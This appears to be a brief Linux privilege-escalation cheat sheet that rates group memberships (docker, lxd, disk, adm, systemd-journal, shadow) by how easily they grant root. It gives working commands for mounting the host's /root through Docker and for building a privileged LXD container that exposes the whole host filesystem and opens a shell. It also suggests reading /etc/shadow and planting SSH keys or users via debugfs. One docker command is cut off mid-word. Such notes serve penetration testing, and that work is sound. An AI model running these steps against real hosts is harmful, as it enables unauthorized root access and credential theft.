
```
id
```

Practically Root
---
Docker
Browse the mounted directory and retrieve or add SSH keys for root user, or read the /etc/shadow file.
```
docker run -v /root:/mnt -it ubunt
```

LXD/LXC
Create a LXD container, make it privileged and access /mnt/root
```
unzip alpine.zip
lxd init
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
lxc init alpine r00t -c security.privileged=true
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
lxc start r00t
lxc exec r00t /bin/sh
```

Disk
We can use debugfs to access the entire file system and again retrieve/add SSH keys or add users

Very Strong, Usually Wins
---
adm
We can read all logs in /var/log and might find sensitive data in the files.

systemd-journal
shadow